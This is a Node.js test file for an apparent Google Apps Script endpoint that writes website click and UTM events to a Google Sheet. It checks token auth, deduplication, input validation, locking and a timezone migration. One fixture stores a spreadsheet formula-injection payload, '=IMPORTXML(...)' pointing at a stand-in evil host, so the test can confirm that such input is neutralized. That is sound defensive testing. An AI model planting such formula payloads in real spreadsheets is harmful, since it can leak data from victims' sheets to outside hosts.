// Run with Node.js. Apps Script services are mocked; no network or credentials.
const fs = require('node:fs');
const path = require('node:path');
const vm = require('node:vm');
const assert = require('node:assert/strict');
const source = fs.readFileSync(path.join(__dirname, '../integrations/google-sheets/Code.gs'), 'utf8');
const rows = [];
const props = {SPREADSHEET_ID: 'test', SITE_KEY_web_a: 'a'.repeat(40), SITE_KEY_web_b: 'b'.repeat(40)};
let locked = false;
let denyLock = false;
const range = (r, c, count, width) => ({
  getValues: () => rows.slice(r - 1, r - 1 + count).map(row => row.slice(c - 1, c - 1 + width)),
  setValues(values) { values.forEach((row, i) => { rows[r - 1 + i] = [...row]; }); return this; },
  setFontWeight() { return this; }, setBackground() { return this; },
  setWrap() { return this; }, setNumberFormat() { return this; }
});
let sheetTimezone;
const sheet = {getLastRow: () => rows.length, getRange: range, setFrozenRows() {}, setColumnWidths() {}, getParent: () => ({setSpreadsheetTimeZone(value) { sheetTimezone = value; }})};
const context = vm.createContext({
  Utilities: {formatDate: (date, timezone, format) => {
    assert.equal(timezone, 'Asia/Jakarta'); assert.equal(format, 'yyyy-MM-dd HH:mm:ss');
    return new Date(date.getTime() + 7 * 3600000).toISOString().slice(0, 19).replace('T', ' ');
  }},
  PropertiesService: {getScriptProperties: () => ({getProperty: key => props[key]})},
  SpreadsheetApp: {openById: () => ({getSheetByName: () => sheet}), flush() {}},
  LockService: {getScriptLock: () => ({
    waitLock() { assert(!locked); locked = true; },
    tryLock() { if (denyLock || locked) return false; locked = true; return true; },
    releaseLock() { locked = false; }
  })},
  ContentService: {MimeType: {JSON: 'json'}, createTextOutput: text => ({text, setMimeType() { return this; }})}
});
vm.runInContext(source, context);
function post(body) {
  context.request = {postData: {contents: JSON.stringify(body)}};
  const value = JSON.parse(vm.runInContext('doPost(request).text', context));
  assert.equal(locked, false, 'Lock was not released');
  return value;
}
const body = {site_id: 'web_a', site_url: 'https://website-a.example/', token: props.SITE_KEY_web_a};
assert.equal(post({...body, action: 'test'}).ok, true);
assert.equal(rows.length, 1, 'Test inserted a click');
const event = {id: '1', occurred_at: '2026-10-28 01:00:00', visitor_id: 'browser-uuid', session_id: 'session-uuid', account_id: 9, account_name: '=IMPORTXML("https://evil.example")', phone: '628123456789', link_type: 'floating', page_path: '/promo', utm_source: 'google', utm_medium: 'cpc', utm_campaign: 'Promo', utm_term: 'keyword', utm_content: 'ad-1', utm_match_type: 'exact', message_source: 'Sumber: google', message_source_recorded: 1};
assert.equal(post({...body, events: [event]}).inserted, 1);
assert.deepEqual(post({...body, events: [event]}).accepted_ids, ['1']);
assert.equal(rows.length, 2, 'Duplicate was inserted');
assert.equal(rows[1][0], 'web_a:1');
assert.equal(rows[1][4], '2026-10-28 08:00:00');
assert.equal(rows[1][5], 'Asia/Jakarta');
assert.equal(vm.runInContext("utrJakartaTime('2026-10-28T14:59:03.670Z')", context), '2026-10-28 21:59:03');
assert.equal(vm.runInContext("utrJakartaTime('2026-10-28 23:30:00')", context), '2026-10-29 06:30:00');
assert.equal(rows[1][9], "'" + event.account_name, 'Spreadsheet formula was not neutralized');
assert.equal(rows[1][10], event.phone);
assert.equal(post({...body, site_id: 'web_b', token: props.SITE_KEY_web_b, events: [event]}).inserted, 1);
assert.equal(rows[2][0], 'web_b:1', 'Websites collided');
assert.equal(post({...body, token: 'wrong', events: [{...event, id: '2'}]}).ok, false);
assert.equal(post({...body, events: [event, {...event, id: '-2'}]}).ok, false);
assert.equal(post({...body, events: Array(101).fill(event)}).ok, false);
assert.equal(post({...body, events: [{...event, utm_source: {bad: true}}]}).ok, false);
assert.equal(rows.length, 3, 'Invalid request changed rows');
denyLock = true;
assert.equal(post({...body, events: [{...event, id: '2'}]}).ok, false);
denyLock = false;
const saved = JSON.stringify(rows.slice(1));
rows[0] = JSON.parse(vm.runInContext('JSON.stringify(UTR_COLUMNS)', context));
vm.runInContext('setupSheet()', context);
assert.equal(rows[0][6], 'ID Browser');
assert.equal(JSON.stringify(rows.slice(1)), saved, 'Header migration changed click data');
vm.runInContext('setupSheet()', context);
assert.equal(JSON.stringify(rows.slice(1)), saved);
assert.equal(sheetTimezone, 'Asia/Jakarta');
// A legacy UTC row is converted once, including its received timestamp.
rows[0] = rows[0].map(label => label.replace('(WIB)', '(UTC)'));
rows[1][4] = '2026-10-28 01:00:00'; rows[1][5] = 'UTC';
rows[1][21] = '2026-10-28T14:59:03.670Z';
vm.runInContext('setupSheet()', context);
assert.equal(rows[1][4], '2026-10-28 08:00:00');
assert.equal(rows[1][21], '2026-10-28 21:59:03');
assert.equal(rows[1][5], 'Asia/Jakarta');
assert.equal(rows[0][4], 'Waktu Klik (WIB)');
const migrated = JSON.stringify(rows);
vm.runInContext('setupSheet()', context);
assert.equal(JSON.stringify(rows), migrated, 'Repeated setup shifted Jakarta times again');
const php = fs.readFileSync(path.join(__dirname, '../utm-traffic-recorder/includes/wa-core.php'), 'utf8');
const keys = JSON.parse(vm.runInContext('JSON.stringify(UTR_COLUMNS)', context));
for (const key of keys.filter(k => !['event_key', 'site_id', 'site_url', 'timezone', 'received_at_utc'].includes(k))) {
  assert.match(php, new RegExp('\\b' + key + '\\b'), 'Receiver field missing from click schema');
}
console.log('Apps Script receiver auth/deduplication/migration tests: PASS');
